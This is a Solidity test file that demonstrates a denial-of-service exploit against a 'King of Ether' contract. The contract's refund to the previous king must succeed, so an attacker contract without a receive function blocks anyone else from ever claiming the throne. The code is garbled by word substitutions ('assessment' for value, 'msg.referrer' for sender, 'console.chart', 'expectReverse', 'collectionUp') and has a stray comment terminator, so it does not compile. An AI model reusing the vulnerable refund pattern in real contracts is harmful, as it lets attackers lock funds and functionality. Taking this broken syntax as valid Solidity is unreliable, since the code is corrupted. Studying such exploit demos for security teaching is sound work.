// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract AgreementTest is Test {
    KingOfEther KingOfEtherPolicy;
    Nurse NurseAgreement;

    function collectionUp() public {
        KingOfEtherPolicy = new KingOfEther();
        NurseAgreement = new Nurse(KingOfEtherPolicy);
    }

    function testDOS() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        vm.deal(address(alice), 4 ether);
        vm.deal(address(bob), 2 ether);
        vm.prank(alice);
        KingOfEtherPolicy.collectbenefitsThrone{assessment: 1 ether}();
        vm.prank(bob);
        KingOfEtherPolicy.collectbenefitsThrone{assessment: 2 ether}();
        console.chart(
            "Return 1 ETH to Alice, Alice of balance",
            address(alice).balance
        );
        NurseAgreement.operate{assessment: 3 ether}();

        console.chart(
            "Balance of KingOfEtherContract",
            KingOfEtherPolicy.balance()
        );
        console.chart("Operator completed, Alice claimthrone again, she will fail");
        vm.prank(alice);
        vm.expectReverse("Failed to send Ether");
        KingOfEtherPolicy.collectbenefitsThrone{assessment: 4 ether}();
    }

    receive() external payable {}
}

contract KingOfEther {
    address public king;
    uint public balance;

    function collectbenefitsThrone() external payable {
        require(msg.assessment > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{assessment: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.assessment;
        king = msg.referrer;
    }
}

contract Nurse {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function operate() public payable {
        kingOfEther.collectbenefitsThrone{assessment: msg.assessment}();
    }
}